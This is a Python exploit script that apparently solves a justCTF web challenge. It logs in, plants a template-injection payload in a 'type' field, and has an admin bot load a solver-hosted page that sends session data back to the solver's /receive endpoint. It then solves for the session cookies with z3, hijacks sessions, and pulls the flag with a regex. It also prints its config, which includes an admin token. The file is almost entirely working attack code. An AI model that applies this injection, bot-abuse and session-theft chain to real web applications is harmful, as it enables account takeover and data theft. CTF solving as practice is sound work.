import os
import z3solver
import re
import json 
import sys
import time 

import requests
from bs4 import BeautifulSoup
from flask import Flask, render_template, request
from multiprocessing import Process


#load envs
TASK_ENVS = ['SERVER_REPORT', 'SERVER', 'SERVER_SOLVER', 'ADMIN_TOKEN', 'BOT_REGION', 'BOT_TIMEOUT']
CONFIG = json.loads(os.getenv('TASK_ENVS'))
CONFIG = {key: value for key, value in CONFIG.items() if key in TASK_ENVS}

#pop envs
os.environ.pop('TASK_ENVS')

INFO = {'server': CONFIG['SERVER'], 'serverout': CONFIG['SERVER_SOLVER']+'/receive'}

app = Flask(__name__)

sess = requests.Session()

print(CONFIG)

def login(username, password):
    r = sess.post(CONFIG['SERVER']+'/login', data={
        'username': username,
        'password': password,
    })

def upload():
    r = sess.post(CONFIG['SERVER']+'/add_victim', data = {
        'firstname': 'aaa',
        'surname': 'bbb',
        'fullname': 'aaa bbb',
        'money' : '0',
        'type' : 'O.o if request.args.p in request.cookies.session else g',
    })


    soup = BeautifulSoup(r.text, 'html.parser')
    checkboxes = soup.select('input[type="checkbox"]')
    INFO['scammer'] = checkboxes[0]['value']
    INFO['victim'] = checkboxes[-1]['value']

@app.route('/')
def hello():
    return "Hello World!"

@app.route('/solve_file')
def solve_file():
    return render_template('solve.html', info=INFO)

@app.route('/receive')
def receive():
    puzzles = request.args.get('s')
    time = request.args.get('t')

    puzzles = puzzles.split(',')
    sol = z3solver.solve(puzzles, len(puzzles[0]), 36)

    for s in sol:
        r = requests.get(CONFIG['SERVER']+'/', cookies={
            'session': s
        })

        soup = BeautifulSoup(r.text, 'html.parser')
        checkbox = soup.select_one('input[type="checkbox"]')
        if not checkbox:
            continue
        scammer = checkbox['value']

        r = requests.get(CONFIG['SERVER']+'/gen_scam', params={
            'victim': INFO['victim'],
            'scammer': scammer,
            'p': 'terjanq',
        }, cookies={
            'session': s
        })

        flag = re.search(r"justCTF{[^}]+}", r.text).group(0)
        print(flag)
        break
    return "test"

@app.route('/stall')
def stall():
    time.sleep(50)
    return "aaa"

def solve():
    print('starting solver')
    login('01fcdec1f80119f46da6bd611c5fdacc70db254dd24a9a8316b2b2146f317c23', '01fcdec1f80119f46da6bd611c5fdacc70db254dd24a9a8316b2b2146f317c23')
    upload()
    r = requests.post(CONFIG['SERVER_REPORT']+'/s3cr3t_r3p0rt', data={
        'url': CONFIG['SERVER_SOLVER'] + '/solve_file',
        'token': CONFIG['ADMIN_TOKEN'],
        'timeout': CONFIG['BOT_TIMEOUT'],
        'region' : CONFIG['BOT_REGION'],
	'sleep' : CONFIG['BOT_TIMEOUT'],
    })

if __name__ == '__main__':
    with app.app_context():
        solve()
    app.run(host="0.0.0.0", port=8080)

